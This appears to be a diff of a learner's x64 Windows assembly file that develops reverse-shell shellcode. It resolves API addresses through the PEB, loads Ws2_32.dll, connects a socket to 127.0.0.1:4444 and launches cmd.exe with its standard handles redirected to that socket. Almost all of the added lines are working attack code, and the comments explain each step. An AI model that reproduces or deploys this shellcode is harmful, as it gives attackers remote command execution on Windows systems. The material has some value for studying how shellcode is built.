@@ -18,16 +18,15 @@ seperate out 7th point
 ; How to flow of shellcode should be
 ; Step1: From FS and GS register find out the address of PEB
 
-
 global main
 
 section .text
 
 main:
-    int3 
+   ; int3 
     push rbp
     mov rbp, rsp
-    sub rsp, 80
+    sub rsp, 200
     mov rax, [gs:0x60]   ; get address of PEB by adding 60h in TEB. get TEB from GS register. Windbg -> dt nt!_teb <address>
                          ; dt nt!_PEB <address>
     mov rax, [rax+0x18]  ; get address of LDR within PEB by adding 18h in PEB. 
@@ -85,12 +84,234 @@ main:
     push rax
     mov rdx, rsp
     sub rsp, 30h
-    call [rbp-16]  ; calling GetProcAddress
+    call [rbp-16]  ; calling GetProcAddress(kernel32, LoadLibraryA)
     add rsp, 40h
     mov [rbp-24], rax  ; saving the address of LoadLibraryA
 
-    ;Fist para (rcx) -> Ws2_32.dll  -->>  6c 6c64 2e32335f327357
+    ; loading Ws2_32.dll in memory
+    ;Fist para (rcx) -> Ws2_32.dll  -->>  6c6c 642e32335f327357
+    xor rax, rax
+    push rax
+    mov ax, 0x6c6c
+    push rax
+    mov rax, 0x642e32335f327357
+    push rax
+    mov rcx, rsp
+    sub rsp, 30h
+    call [rbp-24] ; calling LoadLibraryA(Ws2_32.dll)  able to load (Ws2_32.dll)
+    mov [rbp-32], rax 
+    add rsp, 50h
 
-    call [rbp-24] ; calling LoadLibraryA
-    nop
+    ; getting address of WSAStartup()
+    ; calling get proc address
+    mov rcx, [rbp-32]  ; getting handle to Ws2_32.dll
+    ; function name WSAStartup  -> 7075 7472617453415357
+    xor rax, rax
+    push rax
+    mov ax, 0x7075
+    push rax
+    mov rax, 0x7472617453415357
+    push rax
+    mov rdx, rsp  ; got pointer to WSAStartup
+    sub rsp, 30h
+    call [rbp-16]  ; calling getprocaddress to get the address of WSAStartup
+    mov [rbp-40], rax
+    add rsp, 40h
+
+    ;mov cx, 202h
+    xor rcx, rcx
+    mov cx, 0x0190  ; the value to be moved in cx should be 202h but 190h will also work as it is less than 202h
+                    ; plus we can notice that size of WSADATA structure is 190h
+    sub rsp, rcx
+    mov rdx, rsp
+    sub rsp, 30h
+    and rsp, 0FFFFFFFFFFFFFFF0h
+    call [rbp-40]  ;  calling WSAStartup "this works"
+    add rsp, 0x0190
+
+     ; getting address of WSASocketA()
+    ; calling get proc address
+    mov rcx, [rbp-32]  ; getting handle to Ws2_32.dll
+    ; function name WSASocketA  -> 4174 656b636f53415357
+    xor rax, rax
+    push rax
+    mov ax, 0x4174
+    push rax
+    mov rax, 0x656b636f53415357
+    push rax
+    mov rdx, rsp  ; got pointer to WSASocketA
+    sub rsp, 30h
+    call [rbp-16]  ; calling getprocaddress to get the address of WSASocketA
+    mov [rbp-40], rax 
+    add rsp, 40h
+
+    ; calling WSASocketA
+    ; setting up parameters
+    
+    xor     r9, r9  ; fourth arg
+    mov     r8d, 6  ; third arg
+    mov     edx, 1  ; second arg
+    mov     ecx, 2  ; first arg
+    sub rsp, 40h    ; before setting up arguments in stack we need to create a stack for the function we are going to call
+    and rsp, 0FFFFFFFFFFFFFFF0h
+    mov [rsp+20h], r9   ; fifth arg
+    mov [rsp+28h], r9   ; sixth arg
+    call [rbp-40]  ; calling WSASocket function
+    mov [rbp-48], rax   ; saving the file discriptor of WSASocketA
+    add rsp, 40h
+
+    mov rcx, [rbp-32]  ; getting handle to Ws2_32.dll
+    ; function name connect  ->  74 6365 6e6e6f63
+    ;xor rax, rax
+    ;push rax
+    mov rax, 0x787463656e6e6f63
+    push rax
+    xor rdx, rdx
+    mov [rsp+ 7h], dl 
+    mov rdx, rsp  ; got pointer to connect
+    sub rsp, 30h
+    call [rbp-16]  ; calling getprocaddress to get the address of connect
+    mov [rbp-56], rax 
+    add rsp, 40h
+
+    ; calling function connect
+    ; setting up args for connect
+    ; first arg will be file discriptor
+    mov rcx, [rbp-48]    ; saved the file discriptor in rcx register
+    ; in the second argument we have to pass the address of structure. For that first we will place some values in stack.
+
+    ;   typedef struct sockaddr_in {
+    ;       #if(_WIN32_WINNT < 0x0600)
+    ;            short   sin_family; --> 0002
+    ;       #else //(_WIN32_WINNT < 0x0600)
+    ;            ADDRESS_FAMILY sin_family;
+    ;       #endif //(_WIN32_WINNT < 0x0600)
+    ;       USHORT sin_port;    --> 4444(5c11)
+    ;       IN_ADDR sin_addr;   --> 127.0.0.1
+    ;       CHAR sin_zero[8];   --> 8 bit of 0
+    ;   } SOCKADDR_IN, *PSOCKADDR_IN;
+    ; final structure 00025c117F000001-0000000000000000 
+    ; because of little endian value is put in reverse order --> 0000000000000000-0100007f5c110002
+    ; setting up values for sockaddr_in structure
+    ;started setting up value
+    xor rbx, rbx
+    push rbx
+    mov rax, 0100007f5c110002h
+    push rax
+    ;ended up setting value
+    ;push rbx
+    mov rdx, rsp ; setting up pointer to sockaddr_in structure to rdx
+    mov r8d, 10h
+    sub rsp, 30h
+    call [rbp-56]   ; calling connect function
+    add rsp, 40h
+
+    ;; guess what???? we got connection
+
+    ;Now this is the most difficult part. What all we need to do now is:
+    ; 1. Find the address of CreateProcessA
+    ; 2. Setup two structures:
+    ;       a. STARTUPINFOA
+    ;       b. PROCESS_INFORMATION  
+    ; 3. setting up args for CreateProcessA
+
+    ;Step1:  
+    ;getting address of CreateProcessA -> 41737365636f 7250657461657243 
+    mov rcx, [rbp-8]
+    mov rax, 787841737365636fh
+    push rax
+    xor rdx, rdx
+    mov [rsp+0x6], dl
+    mov [rsp+0x7], dl
+    mov rax, 7250657461657243h
+    push rax
+    mov rdx, rsp
+    sub rsp, 30h
+    call [rbp-16]  ; calling GetProcAddress(kernel32, CreateProcessA)
+    add rsp, 40h
+    mov [rbp-64], rax  ; saving the address of CreateProcessA
+
+    ;Step2. a)
+    ; Structure of STARTUPINFOA
+    ;typedef struct _STARTUPINFOA {
+    ;    18 DWORD   cb;    -->we need to set this  -->> sizeof(structure)
+    ;    17 LPSTR   lpReserved;  --> 0000000000000000
+    ;    16 LPSTR   lpDesktop;  --> 0000000000000000
+    ;    15 LPSTR   lpTitle;  --> 0000000000000000
+    ;    14 DWORD   dwX;  --> 00000000
+    ;    13 DWORD   dwY;  --> 00000000
+    ;    12 DWORD   dwXSize;  --> 00000000
+    ;    11 DWORD   dwYSize;  --> 00000000
+    ;    10 DWORD   dwXCountChars;  --> 00000000
+    ;    9 DWORD   dwYCountChars;  --> 00000000
+    ;    8 DWORD   dwFillAttribute;  --> 00000000
+    ;    7 DWORD   dwFlags;  -->we need to set this   --> 00000101 (STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES)  --> PUSH --> 10100000
+    ;    6 WORD    wShowWindow; --> 0000
+    ;    5 WORD    cbReserved2; --> 0000
+    ;    4 LPBYTE  lpReserved2; --> 0000000000000000
+    ;    3 HANDLE  hStdInput;  -->we need to set this   --> socket handle [rbp-48]
+    ;    2 HANDLE  hStdOutput;  -->we need to set this  --> socket handle [rbp-48]
+    ;    1 HANDLE  hStdError;  -->we need to set this   --> socket handle [rbp-48]
+    ;} STARTUPINFOA, *LPSTARTUPINFOA;
+    xor rdx, rdx
+    ; starting structure
+    mov r14, [rbp-48]
+    push r14 ; 1 This counting is started from last member of structure
+    push r14 ; 2
+    push r14; 3
+    push rdx ; 4
+    push rdx ; 5-6
+    ;mov rcx, 0x1010000000000000 ; 7-8 ; 0000010100000000
+    mov rcx, 0x0000010100000000
+    push rcx ; 7-8
+    push rdx ; 9-10
+    push rdx ; 11-12
+    push rdx ; 13-14
+    push rdx ; 15
+    push rdx ; 16
+    push rdx ; 17
+    mov rcx, 104
+    push rcx ; 
+    ;structure end
+    mov r10, rsp  ; Pointer to STARTUPINFOA
+
+;Step2. b)
+;typedef struct _PROCESS_INFORMATION {
+;    HANDLE hProcess;
+;    HANDLE hThread;
+;    DWORD dwProcessId;
+;    DWORD dwThreadId;
+;} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
+    ;starting structure
+    push rdx
+    push rdx
+    push rdx
+    ;ending structure
+    mov r11, rsp  ; pointer to PROCESSINFORMATION structure
+
+    xor rcx, rcx    ; First arg for CreateProcessA
+    mov rdx, 786578652e646d63h  ;   second arg -> cmd.exe --> 6578652e646d63
+    push rdx 
+    xor rcx, rcx
+    mov [rsp+0x7], cl
+    mov rdx, rsp
+    xor r8, r8  ; arg 3
+    xor r9, r9  ; arg 4
+
+
+    sub rsp, 50h
+    and rsp, 0FFFFFFFFFFFFFFF0h
+    xor rbx, rbx
+    mov bl, 1h
+    mov [rsp+20h], rbx   ; arg 5
+    xor rbx, rbx
+    mov [rsp+28h], rbx   ; arg 6
+    mov [rsp+30h], rbx   ; arg 7
+    mov [rsp+38h], rbx   ; arg 8
+    mov [rsp+40h], r10   ; arg 9
+    mov [rsp+48h], r11   ; arg 10
+    call [rbp-64] ; calling CreateProcessA 
+
+    ;still need to work on thisto remove null bytes
+    ;nop
     ret
